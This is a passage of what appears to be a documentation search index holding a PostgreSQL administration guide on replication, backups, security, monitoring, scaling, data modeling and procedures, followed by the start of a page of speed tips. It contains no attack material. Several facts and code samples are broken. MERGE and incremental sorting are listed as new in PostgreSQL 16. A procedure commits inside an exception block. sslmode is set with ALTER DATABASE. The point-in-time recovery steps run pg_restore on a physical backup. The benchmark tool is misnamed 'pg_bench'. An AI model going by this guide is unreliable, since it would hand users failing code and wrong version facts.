Availability","text":"<p>Ensuring data redundancy and minimizing downtime is critical for mission-critical applications.</p>"},{"location":"postgresql/postgres/#a-streaming-replication","title":"a. Streaming Replication","text":"<p>Description: Real-time replication of data from a primary to one or more standby servers.</p> <p>Setup Steps:</p> <ol> <li>Primary Server Configuration: <pre><code># postgresql.conf\nwal_level = replica\nmax_wal_senders = 10\nwal_keep_segments = 64\nhot_standby = on\n</code></pre></li> </ol> <pre><code># pg_hba.conf\nhost replication replicator 192.168.1.2/32 md5\n</code></pre> <ol> <li> <p>Create a Replication User: <pre><code>CREATE ROLE replicator WITH REPLICATION LOGIN PASSWORD 'replicatorpassword';\n</code></pre></p> </li> <li> <p>Secondary Server Setup:</p> </li> <li> <p>Using <code>pg_basebackup</code>: <pre><code>pg_basebackup -h primary_host -D /var/lib/postgresql/data -U replicator -P --wal-method=stream\n</code></pre></p> </li> <li> <p>Configure Recovery:      For PostgreSQL 12+, use <code>standby.signal</code> and <code>postgresql.auto.conf</code>.      <pre><code>touch /var/lib/postgresql/data/standby.signal\n</code></pre> <pre><code># postgresql.auto.conf\nprimary_conninfo = 'host=primary_host port=5432 user=replicator password=replicatorpassword'\n</code></pre></p> </li> <li> <p>Start PostgreSQL on the Standby: <pre><code>sudo systemctl start postgresql\n</code></pre></p> </li> </ol>"},{"location":"postgresql/postgres/#b-logical-replication","title":"b. Logical Replication","text":"<p>Description: Replicates specific tables or subsets of data, allowing for more granular control.</p> <p>Setup Steps:</p> <ol> <li> <p>Primary Server Configuration: <pre><code># postgresql.conf\nwal_level = logical\nmax_replication_slots = 4\nmax_wal_senders = 10\n</code></pre></p> </li> <li> <p>Create a Publication: <pre><code>CREATE PUBLICATION mypublication FOR TABLE products, orders;\n</code></pre></p> </li> <li> <p>Secondary Server Setup:</p> </li> <li>Create a Subscription: <pre><code>CREATE SUBSCRIPTION mysubscription\nCONNECTION 'host=primary_host port=5432 dbname=mydb user=replicator password=replicatorpassword'\nPUBLICATION mypublication;\n</code></pre></li> </ol>"},{"location":"postgresql/postgres/#c-high-availability-tools","title":"c. High Availability Tools","text":"<p>i. Patroni</p> <p>Description: Automates PostgreSQL failover and leader election using distributed configuration stores like Etcd or Consul.</p> <p>Installation: <pre><code>pip install patroni\n</code></pre></p> <p>Configuration: Create a <code>patroni.yml</code> with cluster and node settings.</p> <p>Starting Patroni: <pre><code>patroni patroni.yml\n</code></pre></p> <p>ii. repmgr</p> <p>Description: Manages replication and failover with additional monitoring capabilities.</p> <p>Installation: <pre><code>sudo apt install repmgr\n</code></pre></p> <p>Configuration: Set up <code>repmgr.conf</code> on all nodes with cluster details.</p> <p>Commands: - Register Nodes: <pre><code>repmgr -f /etc/repmgr.conf primary register\n</code></pre> - Failover: <pre><code>repmgr -f /etc/repmgr.conf standby switchover\n</code></pre></p>"},{"location":"postgresql/postgres/#d-benefits-of-replication","title":"d. Benefits of Replication","text":"<ul> <li>Data Redundancy: Prevent data loss in case of primary server failure.</li> <li>Load Distribution: Offload read operations to standby servers.</li> <li>Disaster Recovery: Facilitate rapid recovery from catastrophic failures.</li> </ul>"},{"location":"postgresql/postgres/#7-backup-and-disaster-recovery","title":"7. Backup and Disaster Recovery","text":"<p>Implementing robust backup strategies ensures data integrity and availability.</p>"},{"location":"postgresql/postgres/#a-logical-backups","title":"a. Logical Backups","text":"<p>Using <code>pg_dump</code>: <pre><code>pg_dump -U myuser -h localhost -F c mydatabase &gt; mydatabase.backup\n</code></pre></p> <p>Using <code>pg_restore</code>: <pre><code>pg_restore -U myuser -h localhost -d mydatabase -1 mydatabase.backup\n</code></pre></p> <p>Pros: - Flexible restoration of specific tables or schemas. - Portable across different PostgreSQL versions.</p> <p>Cons: - Slower for large databases. - Requires downtime for consistent snapshots.</p>"},{"location":"postgresql/postgres/#b-physical-backups","title":"b. Physical Backups","text":"<p>Using <code>pg_basebackup</code>: <pre><code>pg_basebackup -U replicator -h primary_host -D /var/lib/postgresql/backups/base -P -v\n</code></pre></p> <p>Pros: - Fast and efficient for large databases. - Can be used for replication setups.</p> <p>Cons: - Tied to specific PostgreSQL versions. - Less flexible in selective restoration.</p>"},{"location":"postgresql/postgres/#c-point-in-time-recovery-pitr","title":"c. Point-In-Time Recovery (PITR)","text":"<p>Description: Allows restoring the database to a specific moment before a failure or corruption.</p> <p>Setup Steps:</p> <ol> <li> <p>Configure WAL Archiving: <pre><code># postgresql.conf\nwal_level = replica\narchive_mode = on\narchive_command = 'cp %p /var/lib/postgresql/wal_archive/%f'\n</code></pre></p> </li> <li> <p>Perform a Base Backup: <pre><code>pg_basebackup -U replicator -h primary_host -D /var/lib/postgresql/backups/base -P -v\n</code></pre></p> </li> <li> <p>Recovery Procedure:</p> </li> <li> <p>Restore Base Backup: <pre><code>pg_restore -U myuser -h localhost -d mydatabase /backups/mydatabase.backup\n</code></pre></p> </li> <li> <p>Configure Recovery:      Create <code>recovery.signal</code> file and set <code>restore_command</code> in <code>postgresql.auto.conf</code>.      <pre><code>restore_command = 'cp /var/lib/postgresql/wal_archive/%f %p'\nrecovery_target_time = '2025-01-01 12:00:00'\n</code></pre></p> </li> <li> <p>Start PostgreSQL: <pre><code>sudo systemctl start postgresql\n</code></pre></p> </li> </ol>"},{"location":"postgresql/postgres/#d-automated-backup-solutions","title":"d. Automated Backup Solutions","text":"<p>i. Barman</p> <p>Description: Backup and recovery manager for PostgreSQL.</p> <p>Installation: <pre><code>sudo apt install barman\n</code></pre></p> <p>Configuration: Define the PostgreSQL server in <code>barman.conf</code> and set up backup schedules.</p> <p>Commands: - Register Server: <pre><code>barman register mydb\n</code></pre> - Perform Backup: <pre><code>barman backup mydb\n</code></pre> - Restore Backup: <pre><code>barman recover mydb latest /var/lib/postgresql/data\n</code></pre></p> <p>ii. pgBackRest</p> <p>Description: Reliable backup and restore solution with support for parallel processing and compression.</p> <p>Installation: <pre><code>sudo apt install pgbackrest\n</code></pre></p> <p>Configuration: Set up <code>pgbackrest.conf</code> with repository and stanza definitions.</p> <p>Commands: - Initialize Stanza: <pre><code>pgbackrest --stanza=mydb --log-level-console=info stanza-create\n</code></pre> - Perform Backup: <pre><code>pgbackrest --stanza=mydb backup\n</code></pre> - Restore Backup: <pre><code>pgbackrest --stanza=mydb restore\n</code></pre></p>"},{"location":"postgresql/postgres/#e-best-practices","title":"e. Best Practices","text":"<ul> <li>Regular Backups: Schedule frequent backups based on data volatility.</li> <li>Offsite Storage: Store backups in geographically separate locations.</li> <li>Test Restorations: Regularly verify backup integrity by performing test restores.</li> <li>Automate Backup Processes: Use scripts or backup tools to minimize human error.</li> </ul>"},{"location":"postgresql/postgres/#8-security-best-practices","title":"8. Security Best Practices","text":"<p>Ensuring the security of your PostgreSQL database is paramount to protect sensitive data and maintain system integrity.</p>"},{"location":"postgresql/postgres/#a-authentication-and-authorization","title":"a. Authentication and Authorization","text":"<p>i. Role-Based Access Control (RBAC):</p> <ul> <li> <p>Create Specific Roles: <pre><code>CREATE ROLE app_user WITH LOGIN PASSWORD 'securepassword';\n</code></pre></p> </li> <li> <p>Grant Necessary Privileges: <pre><code>GRANT CONNECT ON DATABASE mydatabase TO app_user;\nGRANT USAGE ON SCHEMA public TO app_user;\nGRANT SELECT, INSERT, UPDATE, DELETE ON ALL TABLES IN SCHEMA public TO app_user;\nALTER DEFAULT PRIVILEGES IN SCHEMA public GRANT SELECT, INSERT, UPDATE, DELETE ON TABLES TO app_user;\n</code></pre></p> </li> </ul> <p>ii. Least Privilege Principle: - Assign users only the permissions they require to perform their tasks.</p>"},{"location":"postgresql/postgres/#b-secure-connections","title":"b. Secure Connections","text":"<p>i. Enable SSL/TLS:</p> <ul> <li> <p>Generate SSL Certificates: <pre><code>openssl req -new -text -passout pass:abcd -subj /CN=yourdomain.com -keyout server.key -out server.req\nopenssl rsa -in server.key -passin pass:abcd -out server.key\nopenssl x509 -req -in server.req -text -days 3650 -extfile /etc/ssl/openssl.cnf -extensions v3_ca -signkey server.key -out server.crt\n</code></pre></p> </li> <li> <p>Configure PostgreSQL to Use SSL: <pre><code># postgresql.conf\nssl = on\nssl_cert_file = 'server.crt'\nssl_key_file = 'server.key'\n</code></pre></p> </li> <li> <p>Update <code>pg_hba.conf</code> to Require SSL: <pre><code>hostssl all all 0.0.0.0/0 md5\nhostssl all all ::/0 md5\n</code></pre></p> </li> </ul> <p>ii. Enforce SSL Connections: <pre><code>ALTER DATABASE mydatabase SET sslmode TO 'require';\n</code></pre></p>"},{"location":"postgresql/postgres/#c-data-encryption","title":"c. Data Encryption","text":"<p>i. Encrypt Data at Rest: - Filesystem-Level Encryption: Use tools like LUKS to encrypt the storage volume.</p> <ul> <li>Transparent Data Encryption (TDE): PostgreSQL does not natively support TDE, but extensions like <code>pgcrypto</code> can be used for field-level encryption.</li> </ul> <p>ii. Encrypt Sensitive Columns: <pre><code>CREATE EXTENSION pgcrypto;\n\nCREATE TABLE secure_data (\n    id SERIAL PRIMARY KEY,\n    sensitive_info BYTEA\n);\n\nINSERT INTO secure_data (sensitive_info) \nVALUES (pgp_sym_encrypt('Confidential Data', 'encryption_key'));\n</code></pre></p> <p>Decryption: <pre><code>SELECT pgp_sym_decrypt(sensitive_info, 'encryption_key') AS decrypted_info FROM secure_data;\n</code></pre></p>"},{"location":"postgresql/postgres/#d-network-security","title":"d. Network Security","text":"<p>i. Firewall Configuration: - Restrict PostgreSQL access to trusted IP addresses. - Use firewalls (e.g., <code>ufw</code>, <code>iptables</code>) to limit incoming connections on PostgreSQL's port.</p> <p>ii. Use VPNs or SSH Tunnels: - Secure remote access by routing database connections through VPNs or SSH tunnels.</p>"},{"location":"postgresql/postgres/#e-regular-audits-and-monitoring","title":"e. Regular Audits and Monitoring","text":"<p>i. Enable Detailed Logging: <pre><code># postgresql.conf\nlog_statement = 'all'  # Options: none, ddl, mod, all\nlog_directory = 'log'\nlog_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'\n</code></pre></p> <p>ii. Use Audit Extensions: - pgAudit: Provides detailed session and object audit logging.</p> <p>Installation: <pre><code>CREATE EXTENSION pgaudit;\n</code></pre></p> <p>Configuration: <pre><code># postgresql.conf\nshared_preload_libraries = 'pgaudit'\npgaudit.log = 'all'\n</code></pre></p> <p>iii. Monitor with Tools: - pgAdmin: Comprehensive management and monitoring tool. - Prometheus &amp; Grafana: Set up exporters for PostgreSQL metrics. - ELK Stack (Elasticsearch, Logstash, Kibana): Centralized logging and analysis.</p>"},{"location":"postgresql/postgres/#f-protect-against-sql-injection","title":"f. Protect Against SQL Injection","text":"<p>Best Practices: - Use Parameterized Queries: Avoid constructing queries with string concatenation.</p> <p>Example in psql: <pre><code>PREPARE stmt(text) AS\nSELECT * FROM users WHERE username = $1;\n\nEXECUTE stmt('admin');\n</code></pre></p> <ul> <li>Validate and Sanitize Inputs: Ensure all user inputs are validated before use.</li> </ul>"},{"location":"postgresql/postgres/#g-implement-role-separation","title":"g. Implement Role Separation","text":"<p>Description: Separate roles for different functionalities (e.g., read-only roles, admin roles).</p> <p>Example: <pre><code>CREATE ROLE readonly_user WITH LOGIN PASSWORD 'readonlypassword';\nGRANT CONNECT ON DATABASE mydatabase TO readonly_user;\nGRANT USAGE ON SCHEMA public TO readonly_user;\nGRANT SELECT ON ALL TABLES IN SCHEMA public TO readonly_user;\n</code></pre></p>"},{"location":"postgresql/postgres/#9-monitoring-and-maintenance","title":"9. Monitoring and Maintenance","text":"<p>Continuous monitoring and regular maintenance are essential for optimal PostgreSQL performance and reliability.</p>"},{"location":"postgresql/postgres/#a-monitoring-tools","title":"a. Monitoring Tools","text":"<p>i. pg_stat_statements</p> <p>Description: Tracks execution statistics of all SQL statements.</p> <p>Installation: <pre><code>CREATE EXTENSION pg_stat_statements;\n</code></pre></p> <p>Configuration: <pre><code># postgresql.conf\nshared_preload_libraries = 'pg_stat_statements'\npg_stat_statements.max = 5000\npg_stat_statements.track = all\n</code></pre></p> <p>Usage: <pre><code>SELECT query, calls, total_time, mean_time\nFROM pg_stat_statements\nORDER BY total_time DESC\nLIMIT 10;\n</code></pre></p> <p>ii. Prometheus and Grafana</p> <p>Description: Use exporters like <code>postgres_exporter</code> to collect metrics.</p> <p>Installation: <pre><code># Clone and build\ngit clone https://github.com/prometheus-community/postgres_exporter.git\ncd postgres_exporter\nmake\nsudo make install\n</code></pre></p> <p>Configuration: <pre><code>postgres_exporter --extend.query-path=/path/to/queries.yaml\n</code></pre></p> <p>Grafana Dashboard: Import pre-built PostgreSQL dashboards for visualization.</p> <p>iii. pgBadger</p> <p>Description: Log analyzer for PostgreSQL, generating detailed reports.</p> <p>Installation: <pre><code>sudo apt install pgbadger\n</code></pre></p> <p>Usage: <pre><code>pgbadger /var/lib/postgresql/data/log/postgresql-*.log -o report.html\n</code></pre></p>"},{"location":"postgresql/postgres/#b-automated-maintenance-tasks","title":"b. Automated Maintenance Tasks","text":"<p>i. Vacuuming</p> <ul> <li>Purpose: Reclaim storage and update table statistics.</li> <li>Commands: <pre><code>VACUUM ANALYZE;\n</code></pre></li> </ul> <p>ii. Reindexing</p> <ul> <li>Purpose: Rebuild corrupted or bloated indexes.</li> <li>Commands: <pre><code>REINDEX DATABASE mydatabase;\n</code></pre></li> </ul> <p>iii. Analyzing</p> <ul> <li>Purpose: Update statistics for the query planner.</li> <li>Commands: <pre><code>ANALYZE;\n</code></pre></li> </ul> <p>iv. Regular Updates</p> <ul> <li>Description: Keep PostgreSQL and its extensions up-to-date to benefit from security patches and performance improvements.</li> <li>Commands: <pre><code>sudo apt update\nsudo apt upgrade postgresql\n</code></pre></li> </ul>"},{"location":"postgresql/postgres/#c-alerting","title":"c. Alerting","text":"<p>i. Set Up Alerts for Critical Metrics: - Examples:   - High CPU or memory usage.   - Replication lag exceeding thresholds.   - Disk space running low.   - Query performance degradation.</p> <p>ii. Using Prometheus Alertmanager: <pre><code>groups:\n- name: postgres_alerts\n  rules:\n  - alert: HighReplicationLag\n    expr: pg_stat_replication_lag &gt; 1000\n    for: 5m\n    labels:\n      severity: critical\n    annotations:\n      summary: \"Replication lag is high\"\n      description: \"Replication lag has exceeded 1000ms for more than 5 minutes.\"\n</code></pre></p>"},{"location":"postgresql/postgres/#10-latest-features-in-postgresql-16","title":"10. Latest Features in PostgreSQL 16","text":"<p>PostgreSQL 16 introduces several enhancements and new features aimed at improving performance, usability, and extensibility.</p>"},{"location":"postgresql/postgres/#a-enhanced-json-and-jsonb-support","title":"a. Enhanced JSON and JSONB Support","text":"<ul> <li>JSON Table Functions: Simplify the extraction and transformation of JSON data into tabular formats.</li> </ul> <p>Example: <pre><code>SELECT *\nFROM json_to_recordset('[{\"a\":1,\"b\":\"x\"}, {\"a\":2,\"b\":\"y\"}]') \nAS x(a int, b text);\n</code></pre></p>"},{"location":"postgresql/postgres/#b-improved-query-parallelism","title":"b. Improved Query Parallelism","text":"<ul> <li>Enhanced Parallelism for More Operations: PostgreSQL 16 extends parallel query capabilities to include more functions and operations, reducing query execution time for complex tasks.</li> </ul>"},{"location":"postgresql/postgres/#c-native-merge-statement","title":"c. Native MERGE Statement","text":"<ul> <li>Description: Introduces the SQL-standard <code>MERGE</code> statement, allowing conditional insert/update/delete operations in a single command.</li> </ul> <p>Example: <pre><code>MERGE INTO employees AS target\nUSING new_employees AS source\nON target.id = source.id\nWHEN MATCHED THEN\n  UPDATE SET name = source.name, department = source.department\nWHEN NOT MATCHED THEN\n  INSERT (id, name, department) VALUES (source.id, source.name, source.department);\n</code></pre></p>"},{"location":"postgresql/postgres/#d-stored-procedures-enhancements","title":"d. Stored Procedures Enhancements","text":"<ul> <li>Transaction Control within Procedures: Enhanced capabilities for managing transactions within stored procedures, allowing more granular control.</li> </ul>"},{"location":"postgresql/postgres/#e-incremental-sorting","title":"e. Incremental Sorting","text":"<ul> <li>Description: Allows PostgreSQL to perform incremental sorts, improving performance for queries that require ordered results with partial ordering.</li> </ul>"},{"location":"postgresql/postgres/#f-improved-logical-replication","title":"f. Improved Logical Replication","text":"<ul> <li>Row Filtering and Transformation: Offers more advanced options for filtering and transforming replicated data, enhancing flexibility in replication setups.</li> </ul>"},{"location":"postgresql/postgres/#g-columnar-storage-improvements","title":"g. Columnar Storage Improvements","text":"<ul> <li>Performance Enhancements: Further optimizes columnar storage mechanisms, boosting performance for analytical workloads.</li> </ul>"},{"location":"postgresql/postgres/#h-security-enhancements","title":"h. Security Enhancements","text":"<ul> <li>SCRAM Authentication Improvements: Enhancements to SCRAM (Salted Challenge Response Authentication Mechanism) for better security.</li> <li>Row-Level Security Enhancements: Expanded capabilities for implementing fine-grained access controls.</li> </ul>"},{"location":"postgresql/postgres/#i-monitoring-and-diagnostics","title":"i. Monitoring and Diagnostics","text":"<ul> <li>New System Views and Functions: Additional tools for monitoring database performance and diagnosing issues.</li> </ul> <p>Example: <pre><code>SELECT * FROM pg_stat_activity WHERE state = 'active';\n</code></pre></p>"},{"location":"postgresql/postgres/#11-scaling-postgresql","title":"11. Scaling PostgreSQL","text":"<p>Scaling PostgreSQL effectively involves both vertical and horizontal strategies to handle increased loads and data volumes.</p>"},{"location":"postgresql/postgres/#a-vertical-scaling","title":"a. Vertical Scaling","text":"<p>Description: Enhancing the capabilities of a single PostgreSQL server by adding more CPU, memory, and storage resources.</p> <p>Pros: - Simpler to implement. - No changes to application architecture.</p> <p>Cons: - Limited by hardware capabilities. - Can be cost-prohibitive at scale.</p>"},{"location":"postgresql/postgres/#b-horizontal-scaling","title":"b. Horizontal Scaling","text":"<p>Description: Distributing the database load across multiple servers.</p>"},{"location":"postgresql/postgres/#i-replication","title":"i. Replication","text":"<ul> <li> <p>Streaming Replication: Real-time data replication from primary to standby servers.</p> </li> <li> <p>Logical Replication: Replicates specific tables or subsets of data, allowing for more flexibility.</p> </li> </ul>"},{"location":"postgresql/postgres/#ii-sharding","title":"ii. Sharding","text":"<ul> <li> <p>Description: Divides the database into smaller, more manageable pieces called shards, each hosted on separate servers.</p> </li> <li> <p>Implementation Strategies:</p> </li> <li>Application-Level Sharding: The application directs queries to the appropriate shard based on a sharding key.</li> <li>Using Extensions like Citus: Transforms PostgreSQL into a distributed database, handling sharding transparently.</li> </ul> <p>Example Using Citus: <pre><code># Install Citus\nsudo apt install postgresql-16-citus-12.3\n\n# Configure Citus in postgresql.conf\nshared_preload_libraries = 'citus'\n\n# Restart PostgreSQL\nsudo systemctl restart postgresql\n</code></pre></p> <p>Creating a Distributed Table: <pre><code>SELECT create_distributed_table('orders', 'order_id');\n</code></pre></p>"},{"location":"postgresql/postgres/#c-connection-pooling","title":"c. Connection Pooling","text":"<p>Description: Manages database connections efficiently to handle high traffic and reduce overhead.</p> <p>Using PgBouncer: <pre><code># /etc/pgbouncer/pgbouncer.ini\n[databases]\nmydb = host=localhost port=5432 dbname=mydb\n\n[pgbouncer]\nlisten_addr = 127.0.0.1\nlisten_port = 6432\nauth_type = md5\nauth_file = /etc/pgbouncer/userlist.txt\npool_mode = transaction\nmax_client_conn = 200\ndefault_pool_size = 50\n</code></pre></p> <p>Django Configuration: <pre><code># Adjust connection settings to point to PgBouncer\nDATABASES = {\n    'default': {\n        'ENGINE': 'django.db.backends.postgresql',\n        'NAME': 'mydb',\n        'USER': 'myuser',\n        'PASSWORD': 'mypassword',\n        'HOST': '127.0.0.1',\n        'PORT': '6432',\n    }\n}\n</code></pre></p>"},{"location":"postgresql/postgres/#d-load-balancing","title":"d. Load Balancing","text":"<p>Description: Distributes incoming database requests across multiple servers to optimize resource use and minimize response times.</p> <p>Tools and Techniques: - Pgpool-II: Middleware that provides connection pooling, load balancing, and replication.</p> <p>Installation: <pre><code>sudo apt install pgpool2\n</code></pre></p> <p>Basic Configuration: <pre><code># /etc/pgpool2/pgpool.conf\nlisten_addresses = '*'\nport = 9999\nbackend_hostname0 = 'primary_host'\nbackend_port0 = 5432\nbackend_weight0 = 1\nbackend_data_directory0 = '/var/lib/postgresql/16/main'\n\nbackend_hostname1 = 'replica_host'\nbackend_port1 = 5432\nbackend_weight1 = 1\nbackend_data_directory1 = '/var/lib/postgresql/16/main'\n\nload_balance_mode = on\n</code></pre></p> <ul> <li>HAProxy: General-purpose load balancer that can be configured to distribute PostgreSQL traffic.</li> </ul> <p>Basic Configuration: <pre><code>frontend postgres_front\n    bind *:5432\n    default_backend postgres_back\n\nbackend postgres_back\n    balance roundrobin\n    server primary primary_host:5432 check\n    server replica replica_host:5432 check backup\n</code></pre></p>"},{"location":"postgresql/postgres/#12-advanced-data-modeling","title":"12. Advanced Data Modeling","text":"<p>Effective data modeling ensures data integrity, optimizes performance, and facilitates scalability.</p>"},{"location":"postgresql/postgres/#a-normalization-vs-denormalization","title":"a. Normalization vs. Denormalization","text":"<ul> <li>Normalization: Organize data to reduce redundancy and improve data integrity.</li> </ul> <p>Pros:   - Eliminates data anomalies.   - Simplifies updates and maintenance.</p> <p>Cons:   - Can lead to complex queries and joins.   - Potential performance overhead.</p> <ul> <li>Denormalization: Introduce redundancy to optimize read performance.</li> </ul> <p>Pros:   - Simplifies queries.   - Enhances read performance.</p> <p>Cons:   - Increases complexity in data maintenance.   - Risk of data inconsistencies.</p> <p>Best Practice: Strike a balance based on application requirements, using normalization for data integrity and selective denormalization for performance-critical paths.</p>"},{"location":"postgresql/postgres/#b-recursive-relationships","title":"b. Recursive Relationships","text":"<p>Description: Model hierarchical data structures like organizational charts or category trees.</p> <p>Example: <pre><code>CREATE TABLE categories (\n    id SERIAL PRIMARY KEY,\n    name TEXT NOT NULL,\n    parent_id INTEGER REFERENCES categories(id) ON DELETE CASCADE\n);\n</code></pre></p> <p>Querying Hierarchical Data: <pre><code>WITH RECURSIVE category_tree AS (\n    SELECT id, name, parent_id\n    FROM categories\n    WHERE parent_id IS NULL\n    UNION ALL\n    SELECT c.id, c.name, c.parent_id\n    FROM categories c\n    INNER JOIN category_tree ct ON ct.id = c.parent_id\n)\nSELECT * FROM category_tree;\n</code></pre></p>"},{"location":"postgresql/postgres/#c-polymorphic-associations","title":"c. Polymorphic Associations","text":"<p>Description: Allow a table to reference multiple other tables using a single foreign key.</p> <p>Implementation Strategies: - Single Table Inheritance: All related entities are stored in a single table with nullable columns.</p> <ul> <li> <p>Class Table Inheritance: Separate tables for each entity type with foreign keys pointing to a base table.</p> </li> <li> <p>Use of Foreign Data Wrappers (FDW): Reference external tables as needed.</p> </li> </ul> <p>Example Using Class Table Inheritance: <pre><code>CREATE TABLE media (\n    id SERIAL PRIMARY KEY,\n    type TEXT NOT NULL\n);\n\nCREATE TABLE images (\n    media_id INTEGER PRIMARY KEY REFERENCES media(id) ON DELETE CASCADE,\n    resolution TEXT\n);\n\nCREATE TABLE videos (\n    media_id INTEGER PRIMARY KEY REFERENCES media(id) ON DELETE CASCADE,\n    duration INTEGER\n);\n</code></pre></p> <p>Querying Polymorphic Data: <pre><code>SELECT m.id, m.type,\n       i.resolution,\n       v.duration\nFROM media m\nLEFT JOIN images i ON m.id = i.media_id\nLEFT JOIN videos v ON m.id = v.media_id;\n</code></pre></p>"},{"location":"postgresql/postgres/#d-inheritance-with-extensions","title":"d. Inheritance with Extensions","text":"<p>Using <code>table inheritance</code> can model complex relationships but may introduce challenges in query planning and maintenance. Use extensions like <code>pg_partman</code> for advanced partitioning needs.</p>"},{"location":"postgresql/postgres/#13-custom-functions-and-stored-procedures","title":"13. Custom Functions and Stored Procedures","text":"<p>Enhance PostgreSQL's capabilities by creating custom functions and stored procedures.</p>"},{"location":"postgresql/postgres/#a-creating-custom-functions","title":"a. Creating Custom Functions","text":"<p>Example: Calculating Discounted Price <pre><code>CREATE OR REPLACE FUNCTION calculate_discount(price NUMERIC, discount NUMERIC)\nRETURNS NUMERIC AS $$\nBEGIN\n    RETURN price - (price * discount / 100);\nEND;\n$$ LANGUAGE plpgsql;\n</code></pre></p> <p>Usage: <pre><code>SELECT calculate_discount(100, 15);  -- Returns 85\n</code></pre></p>"},{"location":"postgresql/postgres/#b-stored-procedures-with-transaction-control","title":"b. Stored Procedures with Transaction Control","text":"<p>Description: Introduced in PostgreSQL 11, stored procedures allow explicit transaction control using <code>CALL</code>.</p> <p>Example: <pre><code>CREATE OR REPLACE PROCEDURE transfer_funds(from_account INTEGER, to_account INTEGER, amount NUMERIC)\nLANGUAGE plpgsql AS $$\nBEGIN\n    BEGIN\n        UPDATE accounts SET balance = balance - amount WHERE id = from_account;\n        IF NOT FOUND THEN\n            RAISE EXCEPTION 'From account not found';\n        END IF;\n\n        UPDATE accounts SET balance = balance + amount WHERE id = to_account;\n        IF NOT FOUND THEN\n            RAISE EXCEPTION 'To account not found';\n        END IF;\n\n        COMMIT;\n    EXCEPTION WHEN OTHERS THEN\n        ROLLBACK;\n        RAISE;\n    END;\nEND;\n$$;\n</code></pre></p> <p>Usage: <pre><code>CALL transfer_funds(1, 2, 50);\n</code></pre></p>"},{"location":"postgresql/postgres/#c-language-extensions","title":"c. Language Extensions","text":"<p>Support for Multiple Languages: PostgreSQL allows writing functions in various languages like PL/pgSQL, PL/Python, PL/Perl, and more.</p> <p>Example Using PL/Python: <pre><code>CREATE OR REPLACE FUNCTION py_sum(a INTEGER, b INTEGER)\nRETURNS INTEGER AS $$\n    return a + b\n$$ LANGUAGE plpythonu;\n</code></pre></p> <p>Usage: <pre><code>SELECT py_sum(5, 10);  -- Returns 15\n</code></pre></p> <p>Security Considerations: Ensure that untrusted languages (e.g., PL/Python) are used cautiously to prevent security vulnerabilities.</p>"},{"location":"postgresql/postgres/#14-best-practices-summary","title":"14. Best Practices Summary","text":"<ul> <li>Secure Configuration: Regularly update PostgreSQL, enforce SSL, and implement robust authentication methods.</li> <li>Efficient Indexing: Utilize appropriate index types, maintain indexes, and avoid over-indexing to optimize query performance.</li> <li>Optimized Query Design: Write efficient queries, leverage advanced SQL features, and regularly analyze query performance.</li> <li>Scalable Architecture: Implement replication, partitioning, and sharding strategies to handle growth and ensure high availability.</li> <li>Robust Backup Strategies: Combine logical and physical backups with PITR to safeguard data integrity and enable quick recovery.</li> <li>Comprehensive Monitoring: Use specialized tools to continuously monitor database performance, health, and security.</li> <li>Leverage Extensions: Enhance PostgreSQL's functionality with extensions like PostGIS, pg_trgm, hstore, and more.</li> <li>Maintain Data Integrity: Utilize constraints, triggers, and proper data modeling to ensure consistent and reliable data.</li> <li>Automate Maintenance: Schedule regular maintenance tasks like vacuuming, reindexing, and backups to maintain optimal performance.</li> <li>Document and Test: Maintain thorough documentation and regularly test backup restorations, failovers, and performance optimizations.</li> </ul> <p>Conclusion:</p> <p>Mastering PostgreSQL involves a deep understanding of its advanced features, performance tuning techniques, and best practices for security and scalability. By implementing the strategies outlined in this guide, database administrators and developers can harness PostgreSQL's full potential, ensuring their systems are robust, efficient, and capable of meeting complex data management requirements.</p>"},{"location":"postgresql/tricks/","title":"PostgreSQL Speed Optimization for Advanced Programmers","text":"<p>When it comes to optimizing PostgreSQL, understanding the nuances of configuration, storage, and query structures is essential. This tutorial delves into some advanced tips and tricks to enhance your PostgreSQL's performance. </p>"},{"location":"postgresql/tricks/#1-connection-optimization","title":"1. Connection Optimization","text":""},{"location":"postgresql/tricks/#use-unix-socket-instead-of-tcpip-connection","title":"Use Unix Socket Instead of TCP/IP Connection","text":"<p>By default, local connections in PostgreSQL are made using a Unix-domain socket. If you're connecting to a server on the same machine, a Unix socket can be faster than a TCP/IP connection.</p> <p>Example: To benchmark the difference, you can use <code>pg_bench</code>.</p> <pre><code># Using TCP/IP\npg_bench -h localhost -U your_username your_database\n\n# Using Unix socket\npg_bench -h /var/run/postgresql -U your_username your_database\n</code></pre>"},{"location":"postgresql/tricks/#2-store-data-effectively","title":"2. Store Data Effectively","text":"<p>Storing data in an optimized manner can significantly speed up your queries.</p> <p>Example: Your initial table creation:</p> <pre><code>CREATE TABLE t_test(\n    v1 varchar(100),\n    i1 int,\n    v2 varchar(100),\n    i2 int\n);\n</code></pre> <p>A better way is to group similar data types together:</p> <p><pre><code>CREATE TABLE t_test(\n    v1 varchar(100),\n    v2 varchar(100),\n    i1 int,\n    i2 int\n);\n</code></pre> This can lead to better data locality and cache utilization.</p>"},{"location":"postgresql/tricks/#3-indexing-strategies","title":"3. Indexing Strategies","text":""},{"location":"postgresql/tricks/#add-indexes","title":"Add Indexes","text":"<p>Adding indexes can greatly speed up data retrieval times. However, they also add overhead to write operations. Thus, use them judiciously.</p> <p>Tip: If the text column is long, consider using the <code>hashtext</code> function to speed up operations.</p>"},{"location":"postgresql/tricks/#use-full-text-indexes","title":"Use Full Text Indexes","text":"<p>Full-text search is a technique to search a full-text database against user queries. PostgreSQL provides a way to both store and efficiently search through large volumes of text data.</p> <p>Example:</p> <pre><code>CREATE INDEX idx_gin ON t_test USING gin(to_tsvector('english', v1));\n\n-- Remember to adjust autovacuum settings for performance\nALTER TABLE t_test SET (autovacuum_vacuum_scale_factor = 0.02);\nALTER TABLE t_test SET (autovacuum_analyze_scale_factor = 0.01);\n</code></pre>"},{"location":"postgresql/tricks/#4-query-optimization","title":"4. Query Optimization","text":""},{"location":"postgresql/tricks/#composite-time-trickery","title":"Composite Time Trickery","text":"<p>Rather than unpacking the composite type in the SELECT clause, do it in the FROM clause for better readability and sometimes performance.</p> <p>Example:</p> <p>Instead of: <pre><code>SELECT (pgstattuple('t_email')).* as x;\n</code></pre></p> <p>Use: <pre><code>SELECT (x).* FROM pgstattuple('t_email') AS x;\n</code></pre></p>"},{"location":"postgresql/tricks/#use-fetch-size","title":"Use Fetch Size","text":"<p>When querying large datasets, consider adjusting the fetch size to improve retrieval performance.</p> <p>Example:</p> <pre><code>ALTER FOREIGN TABLE t_email OPTIONS (fetch_size '10000');\n</code></pre> <p>This will retrieve 10,000 rows in each batch from the foreign server, reducing the number of network round-trips 